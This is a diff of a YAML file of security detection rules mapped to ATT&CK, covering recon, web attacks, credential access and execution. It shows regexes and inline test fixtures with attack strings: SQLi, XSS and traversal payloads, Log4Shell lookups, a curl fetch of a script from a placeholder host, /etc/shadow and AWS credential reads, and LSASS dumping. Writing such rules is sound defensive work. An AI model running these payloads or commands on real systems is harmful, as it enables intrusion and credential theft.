@@ -1,440 +1,1602 @@
 # ThreatBrain built-in detection rules (Sigma-inspired, MITRE ATT&CK mapped).
 #
-# Each rule: id, name, severity (info|low|medium|high|critical), confidence
-# (0-100: how likely a match is a true positive), tactics, techniques, tags and
-# a `match` tree. Leaves are {field, <operator>: value}; combine with all/any/not.
-# Operators: equals, contains, startswith, regex (all case-insensitive), in,
-# gt/gte/lt/lte (numeric), exists. `field` is any TriageInput attribute, a
-# dotted path into raw_data (raw.foo.bar), or the pseudo-field `text`, which is
-# every string in the event joined together.
+# File format: {version, rules: [...]}. Each rule has
+#   id, name, severity (info|low|medium|high|critical), confidence (0-100 = how likely a
+#   match is a true positive), techniques (ATT&CK ids; tactics are derived), tags,
+#   references, tuning (what to adjust if it is noisy in your environment), match, tests.
+#   `match` is a tree of {all|any|not} over leaves {field, <operator>: value}.
+#   Operators: equals, contains, startswith, endswith, regex, in, cidr, gt/gte/lt/lte, exists.
+#   Everything is case-insensitive. `field` is a normalized event attribute
+#   (title, event_type, source_ip, destination_ip, destination_port, username, process_name,
+#   command_line, asset_name, outcome), a dotted path into the vendor payload (raw.<key>),
+#   or `text` (every string in the event joined).
+#   Regexes may not contain unbounded wildcards (.* / .+): use a bounded gap such as .{0,200}
+#   (enforced at load time to rule out catastrophic backtracking on attacker-controlled input).
+#   Every rule ships inline `tests` (a positive and a negative case); CI fails if they regress.
+version: "2026.10.2"
+rules:
 
-# --- Authentication (events from tb-collector and SIEMs) ---------------------
-- id: TB-AUTH-001
-  name: Brute-force authentication attack
-  severity: high
-  confidence: 85
-  tactics: [TA0006]
-  techniques: [T1110, T1110.001]
-  tags: [brute-force, credential-access]
-  match: {field: event_type, regex: '^authentication\.(brute_force|brute_force_slow)$'}
-
-- id: TB-AUTH-002
-  name: Successful login after repeated failures (likely account compromise)
-  severity: critical
-  confidence: 90
-  tactics: [TA0006, TA0001]
-  techniques: [T1110, T1078]
-  tags: [account-compromise, credential-access]
-  match: {field: event_type, equals: authentication.brute_force_success}
-
-- id: TB-AUTH-003
-  name: Password spraying
-  severity: high
-  confidence: 85
-  tactics: [TA0006]
-  techniques: [T1110.003]
-  tags: [password-spraying, credential-access]
-  match: {field: event_type, equals: authentication.password_spraying}
-
-- id: TB-AUTH-004
-  name: Distributed / botnet brute-force
-  severity: high
-  confidence: 85
-  tactics: [TA0006]
-  techniques: [T1110, T1110.004]
-  tags: [distributed, botnet, credential-access]
-  match: {field: event_type, equals: authentication.distributed_brute_force}
-
-- id: TB-AUTH-005
-  name: Username enumeration
+# =============================================================== RECONNAISSANCE / DISCOVERY
+- id: TB-RECON-001
+  name: Active reconnaissance reported by a sensor (scanner / directory brute-force)
   severity: medium
   confidence: 75
-  tactics: [TA0043, TA0006]
-  techniques: [T1589.001, T1110]
-  tags: [enumeration, reconnaissance]
-  match: {field: event_type, equals: authentication.username_enumeration}
+  techniques: [T1595.002]
+  tags: [reconnaissance, scanning]
+  tuning: Exclude your own vulnerability scanner source IPs upstream or via an org override.
+  match: {field: event_type, regex: '^recon\.'}
+  tests:
+    - {name: collector recon event, event: {event_type: recon.web_scanning}, expect_match: true}
+    - {name: normal web request, event: {event_type: web.request}, expect_match: false}
 
-- id: TB-AUTH-006
-  name: Impossible travel / anomalous login location
-  severity: high
-  confidence: 70
-  tactics: [TA0001]
-  techniques: [T1078]
-  tags: [impossible-travel, valid-accounts]
+- id: TB-RECON-002
+  name: Offensive scanning or enumeration tool observed
+  severity: medium
+  confidence: 80
+  techniques: [T1595, T1046]
+  tags: [reconnaissance, tooling]
+  tuning: Allow-list authorised scanner hosts (asset_name) if you run Nessus/OpenVAS/nuclei internally.
   match:
     any:
-      - {field: event_type, regex: 'impossible_travel|anomalous_login'}
-      - {field: text, regex: 'impossible travel'}
+      - {field: command_line, regex: '\b(nmap|masscan|zmap|rustscan|nikto|sqlmap|gobuster|dirbuster|feroxbuster|ffuf|wfuzz|nuclei|wpscan|enum4linux|smbmap|nbtscan)\b'}
+      - {field: process_name, regex: '^(nmap|masscan|zmap|rustscan|nikto|sqlmap|gobuster|ffuf|nuclei|wpscan)(\.exe)?$'}
+      - {field: raw.user_agent, regex: '(nmap scripting engine|nikto|sqlmap|masscan|zgrab|nuclei|wfuzz|gobuster|dirbuster|acunetix|nessus|openvas|wpscan)'}
+  tests:
+    - {name: nmap command, event: {command_line: 'nmap -sS -p- 10.0.0.0/24'}, expect_match: true}
+    - {name: sqlmap user agent, event: {raw_data: {user_agent: 'sqlmap/1.7.2#stable (https://sqlmap.org)'}}, expect_match: true}
+    - {name: browser user agent, event: {raw_data: {user_agent: 'Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0'}}, expect_match: false}
+    - {name: word nmap in prose only inside a path-less phrase, event: {command_line: 'echo annmap'}, expect_match: false}
 
-- id: TB-AUTH-007
-  name: MFA fatigue / repeated MFA push denials
-  severity: high
+- id: TB-NET-001
+  name: Port scan reported
+  severity: medium
   confidence: 70
-  tactics: [TA0006]
-  techniques: [T1621]
-  tags: [mfa-fatigue]
+  techniques: [T1046]
+  tags: [port-scan, discovery]
   match:
     any:
-      - {field: event_type, regex: 'mfa.{0,200}(fatigue|push)'}
-      - {field: text, regex: 'mfa (push )?(denied|fatigue|bombing)'}
+      - {field: event_type, regex: 'port_?scan|network\.scan'}
+      - {field: text, regex: '\b(port ?scan(ning)?|syn scan|nmap scan|host sweep)\b'}
+  tests:
+    - {event: {title: 'Port scan detected from 198.51.100.4'}, expect_match: true}
+    - {event: {title: 'Port 443 opened by deployment'}, expect_match: false}
 
-# --- Web application attacks (tb-collector web.{0,200} / recon.{0,200}) ------------------
+- id: TB-DISC-001
+  name: Active Directory / domain reconnaissance command
+  severity: medium
+  confidence: 70
+  techniques: [T1087.002, T1069, T1482]
+  tags: [discovery, active-directory]
+  tuning: Domain admins legitimately run these; scope to non-admin accounts if noisy.
+  match:
+    any:
+      - {field: command_line, regex: 'net1?(\.exe)?\s+(group|user|accounts)\s.{0,40}/domain'}
+      - {field: command_line, regex: 'nltest(\.exe)?\s.{0,40}/(dclist|domain_trusts|trusted_domains)'}
+      - {field: command_line, regex: '\b(dsquery|adfind)(\.exe)?\s+(\*|user|computer|group|-f)'}
+      - {field: command_line, regex: 'get-ad(user|computer|group|domain|trust)\b'}
+      - {field: command_line, regex: '\b(sharphound|bloodhound)\b'}
+  tests:
+    - {event: {command_line: 'net group "Domain Admins" /domain'}, expect_match: true}
+    - {event: {command_line: 'nltest /dclist:corp.example.com'}, expect_match: true}
+    - {event: {command_line: 'net use Z: \\fileserver\share'}, expect_match: false}
+
+- id: TB-DISC-002
+  name: Kerberoasting reconnaissance or ticket request
+  severity: high
+  confidence: 75
+  techniques: [T1558.003]
+  tags: [kerberoasting, credential-access]
+  match:
+    any:
+      - {field: command_line, regex: 'setspn(\.exe)?\s+.{0,20}-(t|q)\s'}
+      - {field: command_line, regex: '\b(invoke-kerberoast|getuserspns|rubeus)\b.{0,100}(kerberoast|asktgs|spn)'}
+      - {field: command_line, regex: '\bGetUserSPNs(\.py)?\b'}
+      - all:
+          - {field: event_type, equals: authentication.kerberos_tgs}
+          - {field: raw.ticket_encryption_type, in: ['0x17', '23', 'rc4-hmac']}
+          - {field: raw.service_name, regex: '^(?!krbtgt)'}
+  tests:
+    - {event: {command_line: 'setspn -T corp -Q */*'}, expect_match: true}
+    - {event: {event_type: authentication.kerberos_tgs, raw_data: {ticket_encryption_type: '0x17', service_name: 'MSSQLSvc/db01'}}, expect_match: true}
+    - {event: {event_type: authentication.kerberos_tgs, raw_data: {ticket_encryption_type: '0x12', service_name: 'MSSQLSvc/db01'}}, expect_match: false}
+
+- id: TB-DISC-003
+  name: Cloud / container resource enumeration of secrets or credentials
+  severity: medium
+  confidence: 65
+  techniques: [T1613, T1526, T1552]
+  tags: [discovery, cloud, kubernetes]
+  match:
+    any:
+      - {field: command_line, regex: 'kubectl\s+get\s+(secrets?|sa|serviceaccounts?)\b.{0,30}(-A|--all-namespaces)'}
+      - {field: command_line, regex: 'aws\s+(iam\s+(list-(users|roles|access-keys)|get-account-authorization-details)|secretsmanager\s+list-secrets|ssm\s+describe-parameters)'}
+      - all:
+          - {field: event_type, regex: '^container\.k8s\.'}
+          - {field: raw.verb, in: [list, get]}
+          - {field: raw.resource, in: [secrets]}
+  tests:
+    - {event: {command_line: 'kubectl get secrets -A -o yaml'}, expect_match: true}
+    - {event: {command_line: 'kubectl get pods -n web'}, expect_match: false}
+
+# =============================================================== INITIAL ACCESS / WEB
 - id: TB-WEB-001
-  name: Web exploitation attempt (SQLi / XSS / traversal / command injection)
+  name: Web exploitation attempt reported by a sensor
   severity: high
   confidence: 80
-  tactics: [TA0001]
   techniques: [T1190]
   tags: [web-attack, initial-access]
-  match: {field: event_type, regex: '^web\.(sql_injection|xss|path_traversal|command_injection)$'}
+  match: {field: event_type, regex: '^web\.(sql_injection|xss|path_traversal|command_injection|log4shell|rce|ssrf|xxe|file_inclusion)$'}
+  tests:
+    - {event: {event_type: web.sql_injection}, expect_match: true}
+    - {event: {event_type: web.request}, expect_match: false}
 
 - id: TB-WEB-002
-  name: Log4Shell (JNDI) remote code execution attempt
+  name: Log4Shell (JNDI lookup) remote code execution attempt
   severity: critical
   confidence: 90
-  tactics: [TA0001, TA0002]
   techniques: [T1190]
   tags: [log4shell, rce, web-attack]
   match:
     any:
       - {field: event_type, equals: web.log4shell}
-      - {field: text, regex: '\$\{jndi:(ldap|ldaps|rmi|dns|iiop)'}
+      - {field: text, regex: '\$\{(jndi|\$\{[^}]{0,20}\}|[a-z:]{0,10}):?(ldap|ldaps|rmi|dns|iiop|nis|corba)s?:'}
+      - {field: text, regex: '\$\{(?:\$\{[^}]{0,30}\}|[jndi:\-]){2,16}(?:\$\{[^}]{0,30}\}|[ldaprmisn:\-]){2,24}//'}
+  tests:
+    - {event: {raw_data: {user_agent: '${jndi:ldap://198.51.100.9:1389/a}'}}, expect_match: true}
+    - {name: obfuscated lookup, event: {raw_data: {url: '/?x=${${lower:j}ndi:${lower:l}dap://x.example/a}'}}, expect_match: true}
+    - {event: {raw_data: {url: '/?price=${amount}'}}, expect_match: false}
 
-- id: TB-RECON-001
-  name: Active reconnaissance (scanner / directory brute-force)
-  severity: medium
-  confidence: 75
-  tactics: [TA0043]
-  techniques: [T1595, T1595.002]
-  tags: [reconnaissance, scanning]
-  match: {field: event_type, regex: '^recon\.'}
-
-- id: TB-NET-001
-  name: Port scan
-  severity: medium
-  confidence: 70
-  tactics: [TA0043, TA0007]
-  techniques: [T1046]
-  tags: [port-scan, discovery]
+- id: TB-WEB-003
+  name: SQL injection payload in a web request
+  severity: high
+  confidence: 80
+  techniques: [T1190]
+  tags: [web-attack, sqli]
+  tuning: Application search boxes that accept SQL-like text may need an org override.
   match:
     any:
-      - {field: event_type, regex: 'port_?scan'}
-      - {field: text, regex: '\b(port ?scan|nmap scan|syn scan)\b'}
+      - {field: text, regex: '(union(\s|\+|/\*.{0,10}\*/|%20){1,5}(all(\s|\+|%20)+)?select\b|(?:\b|%20)or(\s|\+|%20)+1(\s|\+|%20)*=(\s|\+|%20)*1\b|(\s|\+|%20)and(\s|\+|%20)+1(\s|\+|%20)*=(\s|\+|%20)*1\b)'}
+      - {field: text, regex: "('|%27)(\\s|\\+|%20)*(or|and)(\\s|\\+|%20)+('|%27)?\\w{1,10}('|%27)?(\\s|\\+|%20)*=(\\s|\\+|%20)*('|%27)?\\w{1,10}"}
+      - {field: text, regex: '(sleep\s{0,3}\(\s{0,3}\d|benchmark\s{0,3}\(|waitfor(\s|\+|%20)+delay|pg_sleep\s{0,3}\(|information_schema\.|xp_cmdshell|load_file\s{0,3}\(|into(\s|\+|%20)+outfile|extractvalue\s{0,3}\(|updatexml\s{0,3}\()'}
+      - {field: text, regex: '(;|%3b)(\s|\+|%20)*(drop|truncate|delete|insert|update)(\s|\+|%20)+(table|from|into)\b'}
+  tests:
+    - {event: {raw_data: {url: "/item?id=1 UNION SELECT username,password FROM users--"}}, expect_match: true}
+    - {event: {raw_data: {url: "/item?id=1%20OR%201=1"}}, expect_match: true}
+    - {event: {raw_data: {url: "/login?u=admin'--"}}, expect_match: false}
+    - {event: {raw_data: {url: "/item?id=1' or '1'='1"}}, expect_match: true}
+    - {event: {raw_data: {url: "/item?id=1;SELECT pg_sleep(10)--"}}, expect_match: true}
+    - {name: ordinary query string, event: {raw_data: {url: '/search?q=union+station+selection'}}, expect_match: false}
+    - {name: prose about information schema, event: {title: 'Updated documentation for the schema'}, expect_match: false}
 
-# --- Endpoint: execution / defense evasion / credential access ---------------
+- id: TB-WEB-004
+  name: Cross-site scripting payload in a web request
+  severity: high
+  confidence: 75
+  techniques: [T1190, T1059.007]
+  tags: [web-attack, xss]
+  match:
+    any:
+      - {field: text, regex: '(<|%3c)(\s|%20)*(script|svg|iframe|img|body|details|marquee)\b.{0,100}(on\w{3,20}\s*=|src\s*=|javascript:)'}
+      - {field: text, regex: '(<|%3c)script\b'}
+      - {field: text, regex: '(javascript|vbscript|data):(\s|%20)*(text/html|alert|eval|document)'}
+      - {field: text, regex: '\bon(error|load|mouseover|focus|click|toggle)\s*=\s*[^\s&]{0,40}(alert|prompt|confirm|eval|document\.)'}
+  tests:
+    - {event: {raw_data: {url: '/s?q=<script>alert(1)</script>'}}, expect_match: true}
+    - {event: {raw_data: {url: '/s?q=%3Cimg%20src=x%20onerror=alert(1)%3E'}}, expect_match: true}
+    - {event: {raw_data: {url: '/s?q=javascript:alert(document.cookie)'}}, expect_match: true}
+    - {event: {raw_data: {url: '/blog/how-to-write-a-script-for-your-podcast'}}, expect_match: false}
+
+- id: TB-WEB-005
+  name: Path traversal or local file inclusion attempt
+  severity: high
+  confidence: 80
+  techniques: [T1190]
+  tags: [web-attack, traversal, lfi]
+  match:
+    any:
+      - {field: text, regex: '(\.\.(/|\\|%2f|%5c)){2,}'}
+      - {field: text, regex: '(%2e|\.){1,2}(%2e|\.)(%2f|%5c|/|\\)(%2e|\.){1,2}(%2e|\.)(%2f|%5c|/|\\)'}
+      - {field: text, regex: '(/etc/(passwd|shadow|hosts)\b|/proc/self/(environ|cmdline)|boot\.ini|/windows/win\.ini|web\.config\b.{0,10}(\.\.|%2e))'}
+      - {field: text, regex: '(php|file|expect|zip|phar|data)://(filter|input|etc|\w{0,20})'}
+  tests:
+    - {event: {raw_data: {url: '/download?f=../../../../etc/passwd'}}, expect_match: true}
+    - {event: {raw_data: {url: '/download?f=..%2f..%2f..%2fwindows/win.ini'}}, expect_match: true}
+    - {event: {raw_data: {url: '/img/../img/logo.png'}}, expect_match: false}
+
+- id: TB-WEB-006
+  name: Command injection payload in a web request
+  severity: high
+  confidence: 75
+  techniques: [T1190, T1059.004]
+  tags: [web-attack, command-injection]
+  match:
+    any:
+      - {field: text, regex: '(;|\||\|\||&&|%3b|%7c|%26%26)(\s|\+|%20|\$\{ifs\}){0,5}(cat|ls|id|whoami|uname|wget|curl|nc|ncat|bash|sh|ping|nslookup|powershell|cmd)(\s|\+|%20|\$\{ifs\}|\.exe|$)'}
+      - {field: text, regex: '(\$\(|`|%24%28)(\s|\+)?(cat|id|whoami|uname|curl|wget|nc)\b'}
+      - {field: text, regex: '/bin/(ba)?sh\s+-c|cmd(\.exe)?(\s|%20)+/c(\s|%20)'}
+  tests:
+    - {event: {raw_data: {url: '/ping?host=8.8.8.8;cat /etc/passwd'}}, expect_match: true}
+    - {event: {raw_data: {url: '/ping?host=8.8.8.8|whoami'}}, expect_match: true}
+    - {event: {raw_data: {url: '/ping?host=8.8.8.8&&curl http://x.example/a.sh'}}, expect_match: true}
+    - {event: {raw_data: {url: '/search?q=cats&sort=asc'}}, expect_match: false}
+
+- id: TB-WEB-007
+  name: Server-side request forgery toward cloud metadata or internal services
+  severity: high
+  confidence: 75
+  techniques: [T1190, T1552.005]
+  tags: [web-attack, ssrf, cloud]
+  match:
+    any:
+      - {field: text, regex: '(url|uri|redirect|dest|target|path|file|image|link)=[^&\s]{0,40}(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|fd00:ec2::254)'}
+      - {field: text, regex: '(url|uri|redirect|dest|target|link)=[^&\s]{0,20}(https?(://|%3a%2f%2f))(127\.0\.0\.1|localhost|0\.0\.0\.0|\[::1\])'}
+  tests:
+    - {event: {raw_data: {url: '/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'}}, expect_match: true}
+    - {event: {raw_data: {url: '/fetch?url=https://example.org/logo.png'}}, expect_match: false}
+
+- id: TB-WEB-008
+  name: Web shell indicators (file written to web root or shell-like request)
+  severity: high
+  confidence: 75
+  techniques: [T1505.003]
+  tags: [webshell, persistence]
+  match:
+    any:
+      - all:
+          - {field: event_type, regex: '^file\.(create|write|modify|rename)'}
+          - {field: raw.file_path, regex: '(/var/www|/srv/www|/usr/share/nginx|inetpub\\wwwroot|/webapps/|/htdocs/|\\wwwroot\\).{0,120}\.(php|phtml|jsp|jspx|aspx?|ashx|cfm)$'}
+          - {field: process_name, regex: '^(?!(php-fpm|composer|git|rsync|nginx|apache2|httpd|w3wp\.exe)$)'}
+      - {field: text, regex: '(\?|&)(cmd|exec|command|c)=(whoami|id|ls|dir|uname|cat|ipconfig|net(\+|%20)user)'}
+      - {field: text, regex: '\b(c99shell|r57shell|wso\.php|b374k|china\s?chopper|weevely|antsword)\b'}
+  tests:
+    - {event: {event_type: file.create, process_name: bash, raw_data: {file_path: '/var/www/html/uploads/x.php'}}, expect_match: true}
+    - {event: {raw_data: {url: '/uploads/x.php?cmd=whoami'}}, expect_match: true}
+    - {event: {event_type: file.create, process_name: git, raw_data: {file_path: '/var/www/html/index.php'}}, expect_match: false}
+
+- id: TB-WEB-009
+  name: Interpreter or shell spawned by a web server / application server
+  severity: high
+  confidence: 80
+  techniques: [T1190, T1059]
+  tags: [rce, webshell, process-ancestry]
+  tuning: CGI-style applications that intentionally spawn shells need an exclusion on the specific command.
+  match:
+    all:
+      - {field: raw.parent_process, regex: '^(nginx|apache2|httpd|php-fpm\d?(\.\d)?|php-cgi|tomcat\d*|java|node|w3wp\.exe|gunicorn|uwsgi|ruby|puma|catalina)(\.exe)?$'}
+      - {field: process_name, regex: '^(sh|bash|dash|zsh|ksh|cmd\.exe|powershell\.exe|pwsh|nc|ncat|wget|curl|python\d?(\.\d+)?|perl|whoami\.exe|certutil\.exe)$'}
+  tests:
+    - {event: {process_name: bash, raw_data: {parent_process: apache2}}, expect_match: true}
+    - {event: {process_name: cmd.exe, raw_data: {parent_process: w3wp.exe}}, expect_match: true}
+    - {event: {process_name: bash, raw_data: {parent_process: sshd}}, expect_match: false}
+
+- id: TB-INIT-001
+  name: Phishing attachment with an executable or macro-enabled type
+  severity: high
+  confidence: 70
+  techniques: [T1566.001]
+  tags: [phishing, email]
+  match:
+    all:
+      - {field: event_type, regex: '^email\.'}
+      - {field: text, regex: '\.(exe|scr|com|pif|js|jse|vbs|vbe|wsf|hta|lnk|iso|img|cab|jar)\b|\.(docm|xlsm|pptm)\b|\.(pdf|docx?|xlsx?|jpg|png|txt)\.(exe|scr|js|vbs|lnk|bat|cmd)\b'}
+  tests:
+    - {event: {event_type: email.delivered, raw_data: {attachment: 'Invoice_2026.pdf.exe'}}, expect_match: true}
+    - {event: {event_type: email.delivered, raw_data: {attachment: 'budget.xlsm'}}, expect_match: true}
+    - {event: {event_type: email.delivered, raw_data: {attachment: 'report.pdf'}}, expect_match: false}
+
+- id: TB-INIT-002
+  name: Phishing reported or malicious URL clicked
+  severity: medium
+  confidence: 65
+  techniques: [T1566.002]
+  tags: [phishing, email]
+  match:
+    any:
+      - {field: event_type, regex: '^email\.(phish|malicious_url|url_click_blocked|reported_phishing)'}
+      - {field: text, regex: '\b(phishing|credential harvest(ing)?|malicious link)\b.{0,60}(detected|reported|clicked|blocked)'}
+  tests:
+    - {event: {event_type: email.phish_reported}, expect_match: true}
+    - {event: {event_type: email.delivered}, expect_match: false}
+
+- id: TB-LAT-001
+  name: Remote-access service exposed to or used from the internet
+  severity: medium
+  confidence: 60
+  techniques: [T1133, T1021.001]
+  tags: [exposed-service, remote-access]
+  tuning: Remove ports you intentionally expose behind VPN; restrict to non-RFC1918 source_ip.
+  match:
+    all:
+      - {field: event_type, regex: '(firewall|network|connection)\.?(allow|accept|permit|session)?'}
+      - {field: destination_port, in: [3389, 5900, 5985, 5986, 23, 445, 135, 139]}
+      - {field: source_ip, cidr: ['0.0.0.0/0']}
+      - not: {field: source_ip, cidr: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '169.254.0.0/16']}
+  tests:
+    - {event: {event_type: network.firewall.allow, destination_port: 3389, source_ip: 203.0.113.50}, expect_match: true}
+    - {event: {event_type: network.firewall.allow, destination_port: 3389, source_ip: 10.1.2.3}, expect_match: false}
+    - {event: {event_type: network.firewall.allow, destination_port: 443, source_ip: 203.0.113.50}, expect_match: false}
+
+# =============================================================== CREDENTIAL ACCESS / AUTHENTICATION
+- id: TB-AUTH-001
+  name: Brute-force authentication attack
+  severity: high
+  confidence: 85
+  techniques: [T1110.001]
+  tags: [brute-force, credential-access]
+  match: {field: event_type, regex: '^authentication\.(brute_force|brute_force_slow)$'}
+  tests:
+    - {event: {event_type: authentication.brute_force}, expect_match: true}
+    - {event: {event_type: authentication.failed}, expect_match: false}
+
+- id: TB-AUTH-002
+  name: Successful login after repeated failures (likely account compromise)
+  severity: critical
+  confidence: 90
+  techniques: [T1110, T1078]
+  tags: [account-compromise, credential-access]
+  match: {field: event_type, equals: authentication.brute_force_success}
+  tests:
+    - {event: {event_type: authentication.brute_force_success}, expect_match: true}
+    - {event: {event_type: authentication.success}, expect_match: false}
+
+- id: TB-AUTH-003
+  name: Password spraying
+  severity: high
+  confidence: 85
+  techniques: [T1110.003]
+  tags: [password-spraying, credential-access]
+  match: {field: event_type, equals: authentication.password_spraying}
+  tests:
+    - {event: {event_type: authentication.password_spraying}, expect_match: true}
+    - {event: {event_type: authentication.failed}, expect_match: false}
+
+- id: TB-AUTH-004
+  name: Distributed / botnet brute-force
+  severity: high
+  confidence: 85
+  techniques: [T1110, T1110.004]
+  tags: [distributed, botnet, credential-access]
+  match: {field: event_type, equals: authentication.distributed_brute_force}
+  tests:
+    - {event: {event_type: authentication.distributed_brute_force}, expect_match: true}
+    - {event: {event_type: authentication.failed}, expect_match: false}
+
+- id: TB-AUTH-005
+  name: Username enumeration
+  severity: medium
+  confidence: 75
+  techniques: [T1589.001, T1110]
+  tags: [enumeration, reconnaissance]
+  match: {field: event_type, equals: authentication.username_enumeration}
+  tests:
+    - {event: {event_type: authentication.username_enumeration}, expect_match: true}
+    - {event: {event_type: authentication.failed}, expect_match: false}
+
+- id: TB-AUTH-006
+  name: Impossible travel or anomalous sign-in reported by the identity provider
+  severity: high
+  confidence: 70
+  techniques: [T1078]
+  tags: [impossible-travel, valid-accounts, identity]
+  tuning: Corporate VPN egress changes cause false positives; allow-list egress ranges at the IdP.
+  match:
+    any:
+      - {field: event_type, regex: 'impossible_travel|anomalous_(login|signin|sign_in)|risky_sign_?in|atypical_travel'}
+      - {field: text, regex: '(impossible|atypical) travel|anomalous (token|sign-?in)|unfamiliar sign-?in properties'}
+  tests:
+    - {event: {event_type: identity.risky_signin}, expect_match: true}
+    - {event: {title: 'Impossible travel activity'}, expect_match: true}
+    - {event: {event_type: authentication.success}, expect_match: false}
+
+- id: TB-AUTH-007
+  name: MFA fatigue (repeated push prompts denied or ignored)
+  severity: high
+  confidence: 70
+  techniques: [T1621]
+  tags: [mfa-fatigue, identity]
+  match:
+    any:
+      - {field: event_type, regex: 'mfa.{0,20}(fatigue|bombing)'}
+      - {field: text, regex: 'mfa (push )?(denied|fatigue|bombing|rejected by user)'}
+      - all:
+          - {field: event_type, regex: '^(identity|authentication)\.mfa'}
+          - {field: outcome, equals: failure}
+          - {field: raw.reason, regex: 'user (denied|rejected|did not respond)|push (denied|timed out)'}
+  tests:
+    - {event: {title: 'MFA push denied by user'}, expect_match: true}
+    - {event: {event_type: identity.mfa_challenge, outcome: success}, expect_match: false}
+
+- id: TB-AUTH-008
+  name: Authentication from an anonymised network (Tor / known anonymiser)
+  severity: medium
+  confidence: 60
+  techniques: [T1078, T1090]
+  tags: [tor, anonymizer, identity]
+  match:
+    all:
+      - {field: event_type, regex: '^(authentication|identity)\.'}
+      - {field: text, regex: '\b(tor exit node|tor network|anonymi[sz]er|anonymous proxy|known vpn)\b'}
+  tests:
+    - {event: {event_type: authentication.success, raw_data: {ip_reputation: 'Tor exit node'}}, expect_match: true}
+    - {event: {event_type: authentication.success}, expect_match: false}
+
+- id: TB-CRED-001
+  name: Credential dumping tool or LSASS memory access
+  severity: critical
+  confidence: 90
+  techniques: [T1003.001]
+  tags: [mimikatz, lsass, credential-dumping]
+  match:
+    any:
+      - {field: text, regex: '\b(mimikatz|sekurlsa|lsadump|pypykatz|lazagne|nanodump|dumpert)\b'}
+      - {field: command_line, regex: '(procdump(64)?(\.exe)?\s.{0,80}lsass|comsvcs\.dll.{0,40}(minidump|#24|#-?\d+).{0,60}\d+|rundll32.{0,40}comsvcs)'}
+      - {field: command_line, regex: 'lsass(\.exe)?.{0,20}(\.dmp|dump|minidump)'}
+      - all:
+          - {field: raw.target_image, regex: 'lsass\.exe$'}
+          - {field: raw.granted_access, regex: '^0x(1010|1410|1438|143a|1fffff|1f3fff|40)'}
+          - not: {field: process_name, regex: '^(MsMpEng|csrss|wininit|services|svchost|taskmgr|vmtoolsd|wmiprvse|MpDefenderCoreService)(\.exe)?$'}
+  tests:
+    - {event: {command_line: 'procdump.exe -ma lsass.exe lsass.dmp'}, expect_match: true}
+    - {event: {command_line: 'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\t\o.dmp full'}, expect_match: true}
+    - {event: {process_name: x.exe, raw_data: {target_image: 'C:\Windows\system32\lsass.exe', granted_access: '0x1010'}}, expect_match: true}
+    - {event: {process_name: MsMpEng.exe, raw_data: {target_image: 'C:\Windows\system32\lsass.exe', granted_access: '0x1010'}}, expect_match: false}
+
+- id: TB-CRED-002
+  name: Credential store extraction (SAM / NTDS / shadow)
+  severity: high
+  confidence: 80
+  techniques: [T1003.002, T1003.003, T1003.008]
+  tags: [credential-access]
+  match:
+    any:
+      - {field: command_line, regex: '(cat|less|more|cp|tar|head|tail|grep|scp)\s.{0,40}/etc/shadow'}
+      - {field: command_line, regex: 'reg(\.exe)?\s+save\s+hk(lm|ey_local_machine)\\(sam|security|system)'}
+      - {field: command_line, regex: 'ntdsutil.{0,60}(ifm|snapshot|ac i ntds)|vssadmin.{0,40}ntds|esentutl.{0,40}ntds|secretsdump'}
+      - {field: command_line, regex: '\bunshadow\b'}
+  tests:
+    - {event: {command_line: 'cat /etc/shadow'}, expect_match: true}
+    - {event: {command_line: 'reg save HKLM\SAM C:\temp\sam.save'}, expect_match: true}
+    - {event: {command_line: 'cat /etc/hosts'}, expect_match: false}
+
+- id: TB-CRED-003
+  name: Credentials harvested from files, browsers or cloud metadata
+  severity: medium
+  confidence: 65
+  techniques: [T1552.001, T1555.003, T1552.005]
+  tags: [credential-access, secrets]
+  tuning: Backup agents read browser/credential paths; exclude by process_name.
+  match:
+    any:
+      - {field: command_line, regex: '(cat|type|grep|less|cp|copy|tar|zip|7z|curl\s.{0,60}-d\s?@|scp).{0,40}(\.aws/credentials|\.ssh/id_(rsa|ed25519|ecdsa)|\.git-credentials|\.docker/config\.json|\.kube/config|\.pgpass|\.netrc|wp-config\.php|\.env\b)'}
+      - {field: command_line, regex: '(copy|type|cp|cat|sqlite3).{0,80}(Login Data|logins\.json|key[34]\.db|Cookies\b|Web Data|Local State)'}
+      - {field: command_line, regex: '(curl|wget|invoke-webrequest|iwr)\s.{0,40}(169\.254\.169\.254/latest/meta-data/iam|metadata\.google\.internal/computeMetadata/v1/instance/service-accounts|169\.254\.169\.254/metadata/identity)'}
+      - {field: command_line, regex: '(grep|findstr|select-string)\s.{0,20}(-r|-ri|-i|/s|-recurse).{0,40}(password|passwd|secret|api[_-]?key)'}
+  tests:
+    - {event: {command_line: 'cat ~/.aws/credentials'}, expect_match: true}
+    - {event: {command_line: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role'}, expect_match: true}
+    - {event: {command_line: 'grep -ri password /var/www'}, expect_match: true}
+    - {event: {command_line: 'cat ~/.bashrc'}, expect_match: false}
+
+- id: TB-CRED-004
+  name: Offensive password attack or credential relay tooling
+  severity: high
+  confidence: 80
+  techniques: [T1110, T1003]
+  tags: [credential-access, tooling]
+  match:
+    any:
+      - {field: command_line, regex: '\b(hydra|medusa|ncrack|patator|crackmapexec|netexec|kerbrute|responder|ntlmrelayx|evil-winrm|impacket-\w{3,20})\b'}
+      - {field: process_name, regex: '^(hydra|medusa|ncrack|patator|crackmapexec|kerbrute|responder|evil-winrm)(\.exe)?$'}
+      - {field: command_line, regex: '\b(hashcat|john)\b.{0,60}(-m\s?\d{1,5}|--format|\.hash|\.hashes|rockyou)'}
+  tests:
+    - {event: {command_line: 'hydra -l admin -P rockyou.txt ssh://10.0.0.5'}, expect_match: true}
+    - {event: {command_line: 'crackmapexec smb 10.0.0.0/24 -u admin -p Passw0rd'}, expect_match: true}
+    - {event: {command_line: 'john doe wrote a note'}, expect_match: false}
+
+# =============================================================== EXECUTION
 - id: TB-EXEC-001
   name: Encoded or obfuscated PowerShell
   severity: high
   confidence: 85
-  tactics: [TA0002, TA0005]
   techniques: [T1059.001, T1027]
   tags: [powershell, obfuscation]
   match:
     any:
-      - {field: command_line, regex: 'powershell(\.exe)?\s.{0,200}-(e|enc|encodedcommand)\s+[A-Za-z0-9+/=]{20,}'}
